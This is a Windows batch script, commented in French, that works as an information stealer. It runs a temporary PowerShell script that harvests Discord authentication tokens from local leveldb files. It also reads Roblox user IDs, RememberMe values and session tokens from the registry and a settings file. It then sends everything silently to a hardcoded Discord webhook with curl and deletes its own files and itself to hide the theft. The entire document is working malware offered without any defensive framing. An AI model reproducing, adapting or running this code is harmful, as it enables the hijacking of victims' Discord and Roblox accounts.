@echo off
setlocal enabledelayedexpansion
:: PALOFSC - EXFILTRATION SANS MESSAGES D'ERREUR (VERSION FICHIER .PS1)

set "WEBHOOK=https://discord.com/api/webhooks/1524390694376964226/1JXT_Rnb0ocyCJDBnZPuyY9qLctiKxsQe_-phkaif_Hap7ZbRugKdshY6wlYp9Jyq1T8"

:: ETAPE 1 : CREATION DU SCRIPT POWERSHELL (contenu exact, sans erreur)
set "psfile=%TEMP%\extract_tokens.ps1"
set "outfile=%TEMP%\tokens_output.txt"
(
echo $paths = @(
echo     "$env:APPDATA\Discord\Local Storage\leveldb",
echo     "$env:APPDATA\discordptb\Local Storage\leveldb",
echo     "$env:APPDATA\discordcanary\Local Storage\leveldb"
echo )
echo $tokens = @()
echo foreach ($p in $paths) {
echo     if (Test-Path $p) {
echo         Get-ChildItem $p -Filter *.log ^| ForEach-Object {
echo             Select-String -Path $_.FullName -Pattern '[a-zA-Z0-9_\-]{24,28}\.[a-zA-Z0-9_\-]{6,7}\.[a-zA-Z0-9_\-]{27,38}' -AllMatches ^| ForEach-Object { $_.Matches.Value }
echo         } ^| ForEach-Object { $tokens += $_ }
echo     }
echo }
echo $tokens -join ' ' ^| Out-File -FilePath '%outfile%' -Encoding utf8
) > "%psfile%"

:: ETAPE 2 : EXECUTION DU SCRIPT POWERSHELL AVEC -NOLOGO ET REDIRECTION DES ERREURS
powershell -NoLogo -NoProfile -ExecutionPolicy Bypass -File "%psfile%" 2>nul

:: ETAPE 3 : LECTURE DU FICHIER DE SORTIE (s'il existe)
set "tokens="
if exist "%outfile%" (
    for /f "usebackq delims=" %%a in ("%outfile%") do set "tokens=%%a"
    del /f /q "%outfile%" >nul 2>&1
)
del /f /q "%psfile%" >nul 2>&1

:: ETAPE 4 : RECUPERATION DES DONNEES ROBLOX
set "roblox_user="
set "roblox_pass="
set "roblox_token="
for /f "tokens=3*" %%a in ('reg query "HKCU\Software\Roblox\RobloxStudio" /v "UserID" 2^>nul') do set "roblox_user=%%a"
for /f "tokens=3*" %%a in ('reg query "HKCU\Software\Roblox\RobloxStudio" /v "RememberMe" 2^>nul') do set "roblox_pass=%%a"
if exist "%LOCALAPPDATA%\Roblox\GlobalBasicSettings_13.xml" (
  for /f "tokens=2 delims=<>" %%a in ('findstr /r /c:"<token>" "%LOCALAPPDATA%\Roblox\GlobalBasicSettings_13.xml" 2^>nul') do set "roblox_token=%%a"
)

:: ETAPE 5 : CONSTRUCTION DU MESSAGE
set "msg="
if not "!tokens!"=="" set "msg=!msg!Tokens Discord : !tokens!\n"
if not "!roblox_user!"=="" set "msg=!msg!Roblox UserID : !roblox_user!\n"
if not "!roblox_pass!"=="" set "msg=!msg!Roblox RememberMe : !roblox_pass!\n"
if not "!roblox_token!"=="" set "msg=!msg!Roblox Token : !roblox_token!\n"
if "!msg!"=="" set "msg=Aucune donnee collectee.\n"

:: Echappement JSON (guillemets et sauts de ligne)
set "msg=!msg:"=\"!"
set "msg=!msg:\n=\\n!"

:: ETAPE 6 : ENVOI VIA CURL (silencieux)
curl -s -H "Content-Type: application/json" -d "{\"content\":\"%msg%\"}" "%WEBHOOK%" >nul 2>&1

:: ETAPE 7 : NETTOYAGE ET SUPPRESSION DU SCRIPT
set "tokens="
set "roblox_user="
set "roblox_pass="
set "roblox_token="
set "msg="
del /f /q "%~f0" >nul 2>&1
exit /b 0
